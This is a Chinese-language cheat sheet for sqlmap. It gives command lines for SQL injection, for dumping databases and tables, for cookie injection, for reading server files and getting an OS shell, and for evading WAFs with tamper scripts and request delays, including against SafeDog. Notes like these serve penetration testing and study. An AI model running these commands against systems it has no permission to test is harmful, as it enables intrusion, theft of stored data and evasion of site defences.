# Sqlmap

---

所有请求方式都能注入，默认是get/post,但是当使用--level参数>=2时，检查cookies，>=3时检查user-agent和referer、 --level 1 GET|2 cookies|3 POST

提示输入的选择，大写是回车默认选项

出现红色提示就是错误，建议加参数

版本：

```
python 版本，较简便，基础功能都有(https://github.com/sqlmapproject/sqlmap)

kali版本，较全面，可以msf联动
```

---

## 常用：

```
python sqlmap.py -u http://www.xxx.com/id=1 -p Id --random-agent --dbms mysql -proxy=http://127.0.0.1:10809 --threads=5 --dbs
```



---

sqlmap -u "http://URL/id=1"	

## 参数

```

--current-db 		#列出当前的数据库
 
--current-user		#列出当前的权限用户

--threads=线程数    #设置线程数，0~10

--referer IP或域名  #设置访问来源

--is-dba  #查看当前数据库用户权限

--level 等级  （等级越高检测会越全面，总5级）

--dbms 数据库名 （指定数据库类型）

--batch   按照sqlmap的默认提示往下确认

--proxy http://localhost:8080 #代理

-p 参数名  #指定注入点参数，当有多个参数时使用 ,默认全部参数都测试注入

-r 文件名         #该文件是能注入的页面的抓·包

--charset=     #编码格式GBK、UTF-8

--dbs 			#列出服务器中所有的数据库

-D 库名 --tables 	#列出该库的所有表

-D 库名 -T 表名 --columns #列出库名的表名的所有字段名

-D 库名 -T 表名 -C "字段名" --dump #列出库名的表名的字段名的数据

4.0版本可以用

--os-pwn #获取操作系统的shell  ，需要依赖msf（建议在kali里使用）

--sql-shell               
# 文件读取
1.
select load_file('绝对路径') #查看后台登录页面判断登录的代码，找到用户名和密码的代入查询的字段名，和表名（注意，路径使用/，无论是windows还是linux，如要使用\ 就使用\\或者16进制,16进制就不用双引号）windows2003读取C:/windows/system32/inetarv/metabase.xml就可以查看到所有网站根目录
2.
select load data infile '绝对路径' into table user1;  #读取文件写入到user1表中
select * from user;  
3.mysql 5.x以上，sql连接是本地才可以执行
system cat 绝对路径 ;  #执行系统命令读取

```
当无法读取数据库表名

```
情况：
1.版本小于5.0的MySQL没有information_schema表
2.微软Access的MSysObjects表默认不可读
3.数据库用户权限过低无法读取表名

--common-tables  #爆破表名，爆破字典路径txt/common-tables.txt
--common-columns #爆破列名，爆破字典路径txt/common-columns.txt
```



指定注入类型：

```
--technique B
B : 基于Boolean的盲注（Boolean based blind）
Q : 内联查询（Inline queries）
T : 基于时间的盲注（time based blind）
U : 基于联合查询（Union query based）
E : 基于错误（error based）
S : 栈查询（stack queries）
```

---

## cookies注入：（等级2才有cookies注入检测）

sqlmap -u "URL/xxx.php" --cookie "id=n" --level 2 --dbms=mysql --dbs   #cookies注入mysql数据库，查看所有数据库

--cookie "id=n"  --level 2 -D 库名 --tables

--cookie "id=n"  --level 2 -D 库名 -T 表名 --columns

--cookie "id=n"  --level 2 -D 库名 -T 表名 -C "字段名" --dump

\-----------------------------

## temper

tamper（编写绕过规则）：进行绕过waf（防护规则，检测发包间隔）

sqlmap默认tamper有  

sqlmap -u "http://URL/id=1" --tamper "xx.py"  --delay 3 #每次发包延迟3秒再发

 -v 显示包的等级

暂时能过V3.2，更高版本的安全狗要研究

详细：http://www.91ri.org/7852.html

空格 换成 #、随即字符串、换行符

